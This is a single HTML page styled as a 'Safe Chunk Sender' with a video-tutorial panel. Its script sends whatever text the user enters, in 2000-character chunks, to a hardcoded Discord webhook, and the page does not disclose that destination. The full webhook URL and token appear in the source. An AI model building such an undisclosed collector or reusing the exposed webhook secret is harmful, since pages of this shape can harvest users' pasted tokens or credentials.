<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Chunk Sender</title>

<style>
body {
    margin: 0;
    padding: 0;
    background: #08080b;
    font-family: "Inter", Arial, sans-serif;
    color: white;
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    height: 100vh;
}

.main-heading {
    color: #ff6ec7;
    font-size: 30px;
    font-weight: 700;
    letter-spacing: 1px;
    text-shadow: 0 0 10px #ff6ec733;
    margin-bottom: 125px;
    animation: neonGlow 2s ease-in-out infinite alternate;
}

@keyframes neonGlow {
    from { text-shadow: 0 0 10px #ff6ec733, 0 0 20px #ff6ec733; }
    to { text-shadow: 0 0 20px #ff6ec7, 0 0 30px #ff6ec7; }
}

.wrapper {
    display: flex;
    gap: 30px;
}

.container, .video-panel {
    background: rgba(25, 25, 35, 0.9);
    padding: 45px 30px 30px 30px;
    border-radius: 14px;
    width: 340px;
    text-align: center;
    border: 2px solid #6e00ff;
    box-shadow: 0 0 15px #6a00ff55, 0 0 35px #a200ff33;
    transition: 0.25s ease;
}

.container:hover, .video-panel:hover {
    transform: translateY(-4px);
    box-shadow: 0 0 25px #8e00ff88, 0 0 60px #c000ff44;
}

h2 {
    margin-bottom: 20px;
    font-weight: 500;
    letter-spacing: 0.7px;
    color: #dcd2ff;
    text-shadow: 0 0 8px #8e44ff;
}

.input-wrapper {
    display: flex;
    align-items: center;
    background: #201f2f;
    border: 1px solid #3b2c5a;
    border-radius: 8px;
    padding: 8px 12px;
    margin-bottom: 20px;
    transition: 0.25s ease;
}

.input-wrapper svg {
    width: 18px;
    height: 18px;
    margin-right: 8px;
    flex-shrink: 0;
}

.input-wrapper input {
    flex: 1;
    border: none;
    background: transparent;
    color: #e8e8ff;
    font-size: 15px;
    outline: none;
    transition: 0.25s ease;
}

.input-wrapper input:focus {
    transform: scale(1.04);
    box-shadow: 0 0 12px #8e44ff55;
}

button {
    width: 100%;
    padding: 14px;
    background: linear-gradient(135deg, #6e00ff, #b400ff);
    border: none;
    border-radius: 10px;
    font-size: 16px;
    color: white;
    cursor: pointer;
    font-weight: 600;
    letter-spacing: 0.5px;
    transition: 0.25s ease;
    box-shadow: 0 0 20px #7a00ff66;
}

button:hover {
    transform: translateY(-3px) scale(1.05);
    box-shadow: 0 0 30px #9d00ff99;
}

.success {
    margin-top: 15px;
    color: #ff6ec7;
    display: none;
    font-size: 15px;
    text-shadow: 0 0 10px #ff6ec733;
}

.video-box {
    width: 100%;
    height: 200px;
    border-radius: 12px;
    overflow: hidden;
    margin-top: 20px;
    border: 1px solid #3b2c5a;
    box-shadow: inset 0 0 10px #00000055;
}

.video-box video {
    width: 100%;
    height: 100%;
    object-fit: cover;
}
</style>
</head>
<body>

<div class="main-heading">Safe Chunk Sender</div>

<div class="wrapper">

    <div class="container">
        <h2>Send Long Message</h2>

        <div class="input-wrapper">
            <svg xmlns="http://www.w3.org/2000/svg" fill="white" viewBox="0 0 24 24">
                <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8l-6-6zM6 20V4h7v5h5v11H6z"/>
            </svg>

            <input type="text" id="message" placeholder="Enter your message here">
        </div>

        <button onclick="sendData()">Send</button>
        
        <p class="success" id="msg">Sending chunks...</p>
    </div>

    <div class="video-panel">
        <h2>Video Tutorial</h2>

        <div class="video-box">
            <video autoplay muted loop controls>
                <source src="2025-11-14_20-25-04.mp4" type="video/mp4">
            </video>
        </div>
    </div>

</div>

<script>
// Split text into chunks under 2000 characters
function chunkMessage(text, limit = 2000) {
    const chunks = [];
    while (text.length > 0) {
        chunks.push(text.slice(0, limit));
        text = text.slice(limit);
    }
    return chunks;
}

// Helper to delay sending
function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

async function sendData() {
    const message = document.getElementById("message").value.trim();
    if (!message) return;

    const webhook = "https://discord.com/api/webhooks/1439152866605535292/nR4j3hFdhqp4AnXCBVzUaijYXNE1sGgV4gjLEZXuFTvT6u9FYCzAA9_37oChjzM7dQdc"; // Replace with your safe webhook

    const parts = chunkMessage(message);

    for (const part of parts) {
        await fetch(webhook, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ content: part })
        }).catch(err => console.log(err));

        await sleep(100); // 100ms delay to preserve order
    }

    const msgEl = document.getElementById("msg");
    msgEl.style.display = "block";
    setTimeout(() => { msgEl.style.display = "none"; }, 3000);

    document.getElementById("message").value = "";
}
</script>

</body>
</html>
